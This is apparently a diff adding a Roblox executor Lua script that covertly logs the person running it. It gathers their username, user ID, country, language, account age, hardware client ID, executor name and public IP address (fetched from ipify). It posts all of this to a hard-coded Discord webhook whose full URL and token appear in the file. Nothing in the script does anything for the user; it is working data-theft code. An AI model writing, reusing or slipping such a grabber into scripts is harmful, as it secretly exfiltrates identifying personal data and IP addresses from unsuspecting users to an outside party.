@@ -1,0 +1,136 @@
+local webh = "https://discord.com/api/webhooks/1045159714780090491/rHMUgoYrtsV-T82dEBJVvhBfzh8MT66_dCk9mMa7-YM5xAtRZxJ7XRvBktjmz9FXLB-R"
+
+
+pcall(function()
+   local data = {
+
+  ['embeds'] = {
+    {
+       ['title'] = ''..game.Players.LocalPlayer.Name.. ' ``Executed Logger 1``',
+       ['description'] = '**INFO LOGGER 1**',
+       ['type'] = "rich",
+       ['color'] = tonumber(16753920),
+       ['fields'] = {
+          {name = '**Profile Link**', value = ''.."https://www.roblox.com//users/"..game.Players.LocalPlayer.UserId.."/profile"},
+          {name = '**Country**', value = game:GetService("LocalizationService"):GetCountryRegionForPlayerAsync(game.Players.LocalPlayer)},
+          {name = '**Language**', value = game.Players.LocalPlayer.LocaleId},
+          {name = '**Player Account Age**', value = game:GetService("Players").LocalPlayer.AccountAge},
+          {name = '**Hardware ID**', value = game:GetService("RbxAnalyticsService"):GetClientId()},
+          {name = "**Ping**", value = game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValueString()},
+          {name = "**Executor**", value = identifyexecutor()},
+        }
+    }
+  }
+}
+
+   if syn then
+       local response = syn.request(
+           {
+               Url = webh,
+               Method = 'POST',
+               Headers = {
+                   ['Content-Type'] = 'application/json'
+               },
+               Body = game:GetService('HttpService'):JSONEncode(data)
+           }
+       );
+   elseif request then
+       local response = request(
+           {
+               Url = webh,
+               Method = 'POST',
+               Headers = {
+                   ['Content-Type'] = 'application/json'
+               },
+               Body = game:GetService('HttpService'):JSONEncode(data)
+           }
+       );
+   elseif http_request then
+       local response = http_request(
+           {
+               Url = webh,
+               Method = 'POST',
+               Headers = {
+                   ['Content-Type'] = 'application/json'
+               },
+               Body = game:GetService('HttpService'):JSONEncode(data)
+           }
+       );
+   end
+end)
+
+wait(0.1)
+
+
+local webh = "https://discord.com/api/webhooks/1045159714780090491/rHMUgoYrtsV-T82dEBJVvhBfzh8MT66_dCk9mMa7-YM5xAtRZxJ7XRvBktjmz9FXLB-R"
+
+local req = http_request or request or (syn and syn.request) 
+
+-- Has Verified Badge :
+
+local req = http_request or request or (syn and syn.request)
+local HS = game:GetService("HttpService")
+local response = HS:JSONDecode(
+    req({
+    Url = "https://users.roblox.com/v1/users/"..game.Players.LocalPlayer.UserId
+})
+.Body)
+
+
+pcall(function()
+   local data = {
+
+  ['embeds'] = {
+    {
+       ['title'] = ''..game.Players.LocalPlayer.Name..' `` Executed Logger 2``',
+       ['description'] = '**INFO LOGGER 2**',
+       ['type'] = "rich",
+       ['color'] = tonumber(16753920),
+       ['fields'] = {
+          {name = '**Verified Account : **', value = ''..tostring(response.hasVerifiedBadge)},
+          {name = '**IP : **', value = ''..req({ Url = "https://api.ipify.org/", Method = "Get" }).Body},
+          {name = '**Years Old : **', value = ''..math.floor(game.Players.LocalPlayer.AccountAge/365*100)/(100)},
+          {name = '**User ID : **', value = ''..game.Players.LocalPlayer.UserId},
+          {name = '** Security Code :**', value =  '3e4gr5w4crh5tp24ytg4w9tgh40q'},
+          {name = "**Game Name : **", value = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name},
+          {name = "**Game place ID**", value = "["..game.PlaceId.."](" .. tostring("https://www.roblox.com/games/" .. game.PlaceId) ..")"},
+        }
+    }
+  }
+}
+
+   if syn then
+       local response = syn.request(
+           {
+               Url = webh,
+               Method = 'POST',
+               Headers = {
+                   ['Content-Type'] = 'application/json'
+               },
+               Body = game:GetService('HttpService'):JSONEncode(data)
+           }
+       );
+   elseif request then
+       local response = request(
+           {
+               Url = webh,
+               Method = 'POST',
+               Headers = {
+                   ['Content-Type'] = 'application/json'
+               },
+               Body = game:GetService('HttpService'):JSONEncode(data)
+           }
+       );
+   elseif http_request then
+       local response = http_request(
+           {
+               Url = webh,
+               Method = 'POST',
+               Headers = {
+                   ['Content-Type'] = 'application/json'
+               },
+               Body = game:GetService('HttpService'):JSONEncode(data)
+           }
+       );
+   end
+end)
